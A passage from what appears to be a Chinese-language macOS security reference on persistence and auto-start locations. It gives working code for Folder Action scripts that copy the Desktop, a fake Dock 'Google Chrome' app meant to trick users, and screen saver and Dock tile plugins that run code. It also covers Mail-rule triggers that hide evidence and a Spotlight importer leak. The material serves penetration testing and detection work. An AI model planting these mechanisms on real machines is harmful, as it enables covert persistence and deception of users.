### Folder Actions

文章：[https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
文章：[https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- 有助于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但需要能够带参数调用 `osascript`，以联系 **`System Events`** 并配置 Folder Actions
- TCC 绕过：[🟠](https://emojipedia.org/large-orange-circle)
  - 它拥有一些基本的 TCC 权限，例如 Desktop、Documents 和 Downloads

#### 位置

- **`/Library/Scripts/Folder Action Scripts`**
  - 需要 root 权限
  - **触发条件**：访问指定文件夹
- **`~/Library/Scripts/Folder Action Scripts`**
  - **触发条件**：访问指定文件夹

#### 说明与利用

Folder Actions 是一种脚本，会在文件夹发生变化时自动触发，例如添加或移除项目，或执行打开、调整文件夹窗口大小等其他操作。这些操作可用于各种任务，并且可以通过多种方式触发，例如使用 Finder UI 或终端命令。<sup>[[17]](#references)[[18]](#references)</sup>

设置 Folder Actions 的方式包括：

1. 使用 [Automator](https://support.apple.com/guide/automator/welcome/mac) 创建 Folder Action workflow，并将其安装为服务。
2. 在文件夹的上下文菜单中，通过 Folder Actions Setup 手动关联脚本。
3. 使用 OSAScript 向 `System Events.app` 发送 Apple Event 消息，以编程方式设置 Folder Action。
   - 这种方式特别适合将操作嵌入系统，实现一定程度的持久化。

以下脚本示例展示了 Folder Action 可以执行的操作：

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

要使上述脚本可供 Folder Actions 使用，请使用以下命令编译：

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

脚本编译完成后，执行以下脚本来设置 Folder Actions。该脚本会全局启用 Folder Actions，并将之前编译的脚本专门附加到桌面文件夹。

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

使用以下命令运行 setup 脚本：

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- 这是通过 GUI 实现此 persistence 的方式：

这是将要执行的脚本：

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

使用以下命令编译：`osacompile -l JavaScript -o folder.scpt source.js`

将其移动到：

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

然后，打开 `Folder Actions Setup` app，选择**要监视的文件夹**，并在你的情况下选择 **`folder.scpt`**（我这里将它命名为 output2.scp）：

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

现在，如果你用 **Finder** 打开该文件夹，你的脚本就会执行。

此配置以 base64 格式存储在 **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** 这个 **plist** 文件中。

现在，试着在没有 GUI 访问权限的情况下配置此持久化机制：

1. 将 **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** 复制到 `/tmp` 进行备份：
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **移除**刚才设置的 Folder Actions：

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

现在我们有了一个空白环境。

3. 复制备份文件：`cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. 打开 Folder Actions Setup.app 以载入此配置：`open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> 这对我来说不起作用，但这些是 writeup 中的说明 :(

### Dock 快捷方式

Writeup：[https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但你需要在系统中安装一个恶意应用
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- `~/Library/Preferences/com.apple.dock.plist`
  - **触发条件**：用户点击 Dock 中的应用时

#### 描述与利用

Dock 中显示的所有应用都在 plist **`~/Library/Preferences/com.apple.dock.plist`** 中指定<sup>[[19]](#references)</sup>

可以通过以下方式**添加应用**：

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

利用一些 **social engineering**，你可以在 Dock 中冒充 Google Chrome 之类的应用，并实际执行自己的脚本：

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### 输入法

- **写入目标：**安装在 `~/Library/Input Methods/`（用户）或 `/Library/Input Methods/`（管理员）中的、包含代码的输入法 app bundle。这与 Apple 的纯文本 `.inputplugin` 键盘映射文件不同；这类文件本身并不是任意代码 payload。
- **触发方式：**用户在**系统设置 → 键盘 → 文本输入**中添加/启用输入源，然后选择或使用它。仅仅将 bundle 复制到目录中，并不能证明 macOS 会启动它。[Apple 当前的输入源指南](https://support.apple.com/guide/mac-help/mchl84525d76/mac)介绍了如何启用和切换输入源；[Apple 的 InputMethodKit 文档](https://developer.apple.com/documentation/inputmethodkit)介绍了包含代码的输入法。
- **执行身份与限制：**该方法以已登录用户的身份运行，并受输入法注册、代码签名和当前 macOS 安全检查的限制。对于现有已启用且可写的输入法，需要单独检查其路径和签名。

Apple 较早的[第三方输入法说明](https://developer.apple.com/library/archive/qa/qa1810/_index.html)就已警告，将某些调色板输入法复制到这些目录中甚至不会使其出现在输入源列表中。在运行 macOS 26.5.2 的研究 Mac 上，用户目录存在，但没有安装或激活任何 bundle，因此这是一个有条件的文档化路径，而非本机运行结果。

### 颜色选择器

文章：[https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
  - 需要执行非常特定的操作
  - 最终会进入另一个 sandbox
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- `/Library/ColorPickers`
  - 需要 root
  - 触发方式：使用颜色选择器
- `~/Library/ColorPickers`
  - 触发方式：使用颜色选择器

#### 描述与利用

**编译一个颜色选择器** bundle 并加入你的代码（例如可以使用[**这个**](https://github.com/viktorstrate/color-picker-plus)），然后添加一个 constructor（参见[屏幕保护程序部分](macos-auto-start-locations.md#screen-saver)），并将 bundle 复制到 `~/Library/ColorPickers`。<sup>[[20]](#references)</sup>

之后，触发颜色选择器时，你的 bundle 也应该会执行。

这取决于兼容的 app 是否打开系统颜色面板并选择已安装的选择器。[Apple 的颜色面板指南](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html)介绍了旧版 bundle 的存放位置。本地路径检查发现了旧版颜色选择器 XPC 服务，但研究 Mac 上没有安装或加载任何选择器；不要仅凭路径就推断存在 TCC bypass。

请注意，加载你库的二进制文件受到**非常严格的 sandbox 限制**：`/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- 可用于绕过 sandbox：**不能，因为你需要执行自己的应用**
- TCC bypass：取决于已启用扩展的 sandbox 和权限；尚未发现通用 bypass。

#### 位置

- 特定应用

#### 描述与利用

这里有一个包含 Finder Sync Extension 的应用示例：[**点击查看**](https://github.com/D00MFist/InSync)。

应用可以包含 `Finder Sync Extensions`。此扩展会放在一个将要执行的应用中。此外，要让扩展能够执行其代码，**必须使用**有效的 Apple 开发者证书**签名**，必须处于 **sandboxed** 状态（尽管可以添加放宽限制的例外），并且必须通过类似以下的方式注册：<sup>[[21]](#references)[[22]](#references)</sup>

已安装的扩展还需要**启用**，并在相关的 Finder 位置或项目中被调用；仅编写一个任意的 `.appex` bundle 并不足够。[Apple 的 Finder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) 可用于查询启用状态。下面的 `pluginkit` 命令展示了显式注册和启用，而非仅凭文件实现自动启动。此方案经过文档审查，研究用 Mac 上没有安装或启用新的扩展。

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### 屏幕保护程序

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
  - 但最终会进入常见的应用程序 sandbox
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- `/System/Library/Screen Savers`
  - 需要 root 权限
  - **触发方式**：选择该屏幕保护程序
- `/Library/Screen Savers`
  - 需要 root 权限
  - **触发方式**：选择该屏幕保护程序
- `~/Library/Screen Savers`
  - **触发方式**：选择该屏幕保护程序

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### 描述与利用

在 Xcode 中创建一个新项目，并选择模板以生成新的 **屏幕保护程序**。然后，将代码添加到其中，例如添加以下代码来生成日志。<sup>[[23]](#references)[[24]](#references)</sup>

**Build** 完成后，将 `.saver` bundle 复制到 **`~/Library/Screen Savers`**。然后，打开屏幕保护程序 GUI，点击该屏幕保护程序，它就应该会生成大量日志：

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> 请注意，由于加载此代码的二进制文件（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）的 entitlements 中包含 **`com.apple.security.app-sandbox`**，因此你将处于**常见的应用程序沙箱**内。

屏保代码：

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight 插件

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- 可用于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - 但最终会处于 application sandbox 中
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - sandbox 看起来限制很多

#### 位置

- `~/Library/Spotlight/`
  - **触发条件**：创建扩展名由 Spotlight 插件管理的新文件。
- `/Library/Spotlight/`
  - **触发条件**：创建扩展名由 Spotlight 插件管理的新文件。
  - 需要 root 权限
- `/System/Library/Spotlight/`
  - **触发条件**：创建扩展名由 Spotlight 插件管理的新文件。
  - 需要 root 权限
- `Some.app/Contents/Library/Spotlight/`
  - **触发条件**：创建扩展名由 Spotlight 插件管理的新文件。
  - 需要新 app

#### 描述与利用

Spotlight 是 macOS 内置的搜索功能，旨在让用户**快速、全面地访问电脑上的数据**。\
为了实现快速搜索，Spotlight 会维护一个**专有数据库**，并通过**解析大多数文件**来创建索引，从而快速搜索文件名及其内容。<sup>[[25]](#references)</sup>

Spotlight 的底层机制包含一个名为“mds”的中央进程，它代表**“metadata server”（元数据服务器）**。该进程负责协调整个 Spotlight 服务。此外，还有多个“mdworker”守护进程执行各种维护任务，例如为不同文件类型编制索引（`ps -ef | grep mdworker`）。这些任务通过 Spotlight importer 插件，即**“.mdimporter bundles”**实现，使 Spotlight 能够理解并索引各种文件格式的内容。

这些插件或**`.mdimporter`** bundles 位于前面提到的位置。系统必须发现新的 bundle，并确认它匹配某种文件类型；同时，Spotlight 还必须实际索引匹配的文件。仅复制 bundle 并不能证明它已加载。[Apple 的 MDImporter 参考文档](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter)指出，加载与符合条件的已更改文件有关。此处未测试 macOS 26 上的 Spotlight importer 执行情况。

可以通过运行以下命令**查找所有已加载的 `mdimporters`**：

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

例如，**/Library/Spotlight/iBooksAuthor.mdimporter** 用于解析这类文件（包括扩展名为 `.iba` 和 `.book` 的文件）：

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> 如果检查其他 `mdimporter` 的 Plist，可能找不到 **`UTTypeConformsTo`** 条目。这是因为它是内置的 _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier))，无需指定扩展名。
>
> 此外，系统默认插件始终优先，因此攻击者只能访问 Apple 自带的 `mdimporter` 不会索引的文件。

要创建自己的 importer，可以从这个项目开始：[https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer)，然后更改名称和 **`CFBundleDocumentTypes`**，并添加 **`UTImportedTypeDeclarations`**，使其支持你想要支持的扩展名，并在 **`schema.xml`** 中反映这些更改。\
然后**更改**函数 **`GetMetadataForFile`** 的代码，使其在创建具有所处理扩展名的文件时执行你的 payload。

最后，**构建新的 `.mdimporter` 并将其复制到前面提到的三个位置之一**。你可以通过**监控日志**或运行 **`mdimport -L`** 来检查它是否已加载。

> [!TIP]
> 尽管 importer sandbox 限制非常严格，`mdworker` 仍会以**特权读取权限**索引文件。因此，恶意 `.mdimporter` 可以读取 TCC 保护位置（Downloads、Pictures、Desktop 等）中的文件*内容*，并在不触发任何 TCC 提示的情况下外传收集到的元数据——这就是 **“Sploitlight” TCC bypass (CVE-2025-31199)**，已在 macOS Sequoia 15.4 中修复。<sup>[[55]](#references)</sup>

关于 macOS 26 中一种不同的技术——通过 **Darwin notification names** 而非系统日志携带受保护字节——请参阅 [Spotlight importer leakage via Darwin notification names](macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/#spotlight-importer-leakage-via-darwin-notification-names)。<sup>[[57]](#references)</sup>

### ~~Preference Pane~~

> [!CAUTION]
> 看起来这已经不起作用了。

Writeup：[https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
  - 需要用户执行特定操作
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

看起来这已经不起作用了。<sup>[[26]](#references)</sup>

### Application Script Files

Writeup：[https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但需要安装目标应用，并且受害者需要运行或使用它
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### Location

**已安装的应用或工具实际执行**且攻击者能够修改的**解释型脚本**。请确认文件权限和调用路径；仅仅找到 `.sh` 或 `.py` 文件并不足够。Apple 的[代码签名指南](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html)指出，签名的应用 bundle 会密封资源，包括脚本。编辑 bundle 内的脚本会破坏该密封，bundle 验证时可能会检测到或阻止此操作。Homebrew 启动器等外部脚本的签名和信任行为则有所不同。Writeup 中的历史示例包括：

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – 旧版 Sublime Text 使用的脚本；需检查已安装版本中该文件是否存在，以及启动时是否会使用它。测试用的 Mac 上不存在该文件。
- **`/opt/homebrew/bin/brew`**（Apple Silicon）或 **`/usr/local/bin/brew`**（Intel）– 调用对应 `brew` 路径时执行的 Bash 启动器，前提是已安装且攻击者有写入权限。测试用的 Mac 上，`/opt/homebrew/bin/brew` 是可写的 Bash 脚本；这只是本地观察结果，并非普遍适用的 Homebrew 权限规则。
- **Python app bundle 中 IDLE 的 `idlemain.py`** – 写入可能需要管理员权限，但脚本会以 IDLE 用户的身份运行。
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – 安装了对应的 `org.wireshark.ChmodBPF` launchd job 时，会以 root 身份运行的历史 shell 脚本。测试用的 Mac 上该脚本和 job 均不存在。

#### Description & Exploitation

某些工具和应用会在运行时执行解释型脚本。如果签名验证、quarantine 和其他检查允许，可写脚本便能在其特定调用程序下次运行时执行添加的命令。原始研究展示了 2019 年的几种安装情况；请在目标版本上重新检查这些路径和触发条件。<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

此复制测试在 macOS 26.5.2 上输出了 `marker fired: True`；原始启动器未受影响。这证明插入点会在副本中执行，但不能证明修改过的签名 app bundle 或真实的 Homebrew 安装能够通过所有启动检查。

### Dock Tile Plugins

分析文章：[https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 需要声明该插件的 app 被发现/注册，并由 Dock 处理
  - 插件会加载到一个**由 Apple 签名**的 helper 中，该 helper 没有 app-sandbox entitlement，且**禁用了 library validation**。引用的研究中未在 Background Task Management UI 中显示此 helper；应检查目标版本上的可见性。
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**，在 app 的 `Info.plist` 中通过 **`NSDockTilePlugIn`** 键引用；插件自身的 `Info.plist` 设置 **`NSPrincipalClass`**。

#### 描述与利用

当 app 声明 `NSDockTilePlugIn` 时，Dock 可以在登录时或其 tile 被添加时，将所引用的 bundle 加载到 **`com.apple.dock.external.extra`** XPC helper（Apple Silicon 上为 `...extra.arm64`）；app 本身无需启动。这要求该 app 被 macOS 发现/注册并接受。此 helper **由 Apple 签名**，没有 `com.apple.security.app-sandbox` entitlement，并启用了 `com.apple.security.cs.disable-library-validation`。加载时会调用 principal class 的 **`setDockTile:`** 方法；之后可从此处订阅分布式通知（例如 `com.apple.screenIsLocked`），以接收后续事件。<sup>[[38]](#references)</sup>

在 macOS 26.5.2 上，通过只读 `codesign` 检查确认了该 helper 的 Apple 签名及 entitlements，并发现若干已安装的 app 声明了 `NSDockTilePlugIn`。该 Mac 上未安装或加载新的插件，因此在此版本上执行新编写的 bundle 仍未经测试。

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets（Notification Center / WidgetKit）

Writeup：[https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - widget extension 在**自己的进程**中运行，添加 widget **不会**触发 Background Task Management alert
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)
  - 配置 plist 位于受 TCC 保护的容器中，因此从外部编辑它需要 Full Disk Access 或 TCC bypass

#### 位置

- Widget extension bundle：**`<App>.app/Contents/PlugIns/<Widget>.appex`**
- 已启用/已注册的 widgets：**`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`**（键 `widgets.instances` 和 `widgets.widgets`）

#### 描述与利用

应用内置的 WidgetKit extension 在由 Notification Center 管理的**独立进程**中运行。在 `widgets.instances` 中注册一个实例（其中包含带有嵌入式 `INIntent` 数据的 base64 `NSKeyedArchiver` 编码 `CHSWidget` blob），然后重启 NotificationCenter，即可加载 widget 并执行其 `TimelineProvider`/intent 代码。<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app Rules (运行 AppleScript)

Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
  - 但 Mail.app 必须已配置账户并正在运行；触发条件是收到一封邮件
- TCC 绕过: [🔴](https://emojipedia.org/large-red-circle)
  - 在 Mail 外部编辑规则/脚本可能需要先关闭 Mail；在较新的 macOS 上还需要 Full Disk Access

#### 位置

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`**（本地规则；Sonoma/Sequoia 上为 `V10`，更新版本上为 `V11`+）
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`**（iCloud 同步的规则，优先级更高）
- 规则启用状态：**`RulesActiveState.plist`**；AppleScript payload：**`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### 描述与利用

Apple Mail **规则**可以包含 *“Run AppleScript”* 操作。通过添加一条匹配精心构造的**主题行**并运行攻击者脚本的规则，攻击者就能在收到特定邮件时，在 Mail 的上下文中获得**可远程触发且隐蔽**的代码执行——由于不会创建 LaunchAgent/Login Item，这种方式能绕过许多持久化扫描器。<sup>[[42]](#references)</sup> 将规则设为同时**删除**触发邮件可以隐藏证据。防御者可以直接搜寻此类规则：<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### 配置描述文件 (.mobileconfig)

Writeup: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- 可用于绕过 sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - 现代 macOS 要求用户在系统设置 → *设备管理* 中**手动批准**（在 MDM 之外，静默执行 `profiles install` 已不可用）
- TCC 绕过: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- 已安装的描述文件位于 **`/Library/Managed Preferences/`** 和 **`/var/db/ConfigurationProfiles/`** 下；描述文件是一个包含 `PayloadContent` 数组的 XML plist。

#### 描述与利用

`.mobileconfig` 不是直接的代码执行原语，但它可以持久化配置，例如**受信任的根 CA**（`com.apple.security.root`）、**全局或 PAC 代理**（`com.apple.proxy.*`）、**托管偏好设置**（`com.apple.ManagedClient.preferences`）或限制。在 macOS 10.15 及更高版本中，Apple 的 [`PayloadRemovalDisallowed` 定义](https://developer.apple.com/documentation/devicemanagement/toplevel)指出：对于**手动安装**的描述文件，若将其设为 `true` 且未配置移除密码 payload，则移除时需要**管理员身份验证**；这并不意味着该描述文件绝对无法移除。MDM 安装的描述文件遵循单独的管理和移除规则。<sup>[[44]](#references)</sup>

> [!WARNING]
> 普通配置描述文件**没有可用于投放任意 `LaunchDaemon`/`LaunchAgent` 的 payload 类型**。以这种方式安装 daemon 需要完整的 **MDM 注册**以及管理代理/脚本 — 不要将 `.mobileconfig` 视为 launchd 投放机制。

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

